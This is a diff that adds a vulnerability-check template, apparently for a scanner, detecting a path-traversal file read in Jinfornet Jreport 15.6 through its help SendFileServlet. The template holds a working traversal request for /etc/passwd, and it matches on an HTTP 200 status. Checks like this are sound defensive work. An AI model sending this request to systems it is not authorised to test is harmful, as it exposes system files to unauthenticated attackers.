@@ -1,0 +1,20 @@
+id: jinfornet-jreport-lfi
+brief:
+    title: Jinfornet Jreport 15.6 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Jinfornet Jreport 15.6 is vulnerable to local file incluion via the Jreport Help function in the SendFileServlet. Exploitaiton allows remote unauthenticated users to view any files on the Operating...
+    label:
+        - jreport
+        - jinfornet
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
